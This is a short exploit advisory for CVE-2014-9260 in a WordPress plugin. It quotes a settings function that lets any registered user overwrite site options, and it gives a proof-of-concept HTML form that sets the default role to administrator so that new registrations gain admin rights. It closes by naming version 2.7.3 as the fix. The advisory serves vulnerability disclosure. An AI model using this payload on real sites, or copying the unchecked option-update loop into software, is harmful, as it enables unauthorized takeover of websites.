# Date: 24-11-2014
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: webapps
# CVE: CVE-2014-9260
 
1. Description
   
Every registered user can update every WordPress options using basic_settings() function.
 
function basic_settings()
{
    if (isset($_POST[&#039;task&#039;]) && $_POST[&#039;task&#039;] == &#039;wdm_save_settings&#039;) {
 
        foreach ($_POST as $optn => $optv) {
            update_option($optn, $optv);
        }
        if (!isset($_POST[&#039;__wpdm_login_form&#039;])) delete_option(&#039;__wpdm_login_form&#039;);
 
 
 
        die(&#039;Settings Saved Successfully&#039;);
    }
    include(&#039;settings/basic.php&#039;);
}
 
 
2. Proof of Concept
 
Login as standard user (created using wp-login.php?action=register) then:
 
    <input type="hidden" name="task" value="wdm_save_settings">
    <input type="hidden" name="section" value="basic">
    <input type="hidden" name="default_role" value="administrator">
    <input type="submit" value="Hack!">
</form>
 
After that create new user using wp-login.php?action=register. Newly created user will have admin privileges.
 
3. Solution:
   
Update to version 2.7.3

